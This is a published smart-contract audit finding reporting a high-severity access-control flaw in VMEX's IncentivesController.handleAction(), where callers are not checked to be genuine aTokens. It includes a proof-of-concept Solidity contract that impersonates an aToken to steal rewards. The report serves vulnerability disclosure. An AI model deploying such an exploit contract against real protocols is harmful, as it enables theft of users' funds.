# [H] Incorrect access control in `IncentivesController.handleAction()`

## Summary
Severity: High
Chain: Smart contract
Component: VMEX
Published: 2023-06-19
Source: https://github.com/hats-finance/VMEX-0x050183b53cf62bcd6c2a932632f8156953fd146f/issues/14
Type: hats-finding

## Details
**Github username:** @bahurum
**Submission hash (on-chain):** 0xa2e6ee3d3cf681e9d27a8968aecea25a6ccaae3ce0addf0856ad88ecc9cff19f
**Severity:** high severity

**Description:**
## Description
In `IncentivesController.handleAction()` it is not checked properly that `msg.sender` is indeed a valid `aToken`. This allows anyone to impersonate an `aToken` and steal rewards from the `IncentivesController`.

## Attack scenario:
The attacker will deploy a contract like this:

```solidity:
contract aTokenImpersonator {

    address public UNDERLYING_ASSET_ADDRESS;
    uint64 public _tranche;
    address incentivesController;

    constructor(address _underlying, uint64 _trancheId, address _ic) external {
        // attacker sets underlying and tranche of the aToken impersonated
        UNDERLYING_ASSET_ADDRESS = _underlying;
        _tranche = _trancheId;
        incentivesController = _ic;
    }

    function steal(
        uint256 totalSupply,
        uint256 oldBalance,
        uint256 newBalance,
    ) external {
        IncentivesController(incentivesController).handleAction(
            totalSupply,
            oldBalance,
            newBalance,
            DistributionTypes.Action.WITHDRAW
        );
    }

```

_Trimmed to 38 lines — full report: https://github.com/hats-finance/VMEX-0x050183b53cf62bcd6c2a932632f8156953fd146f/issues/14_
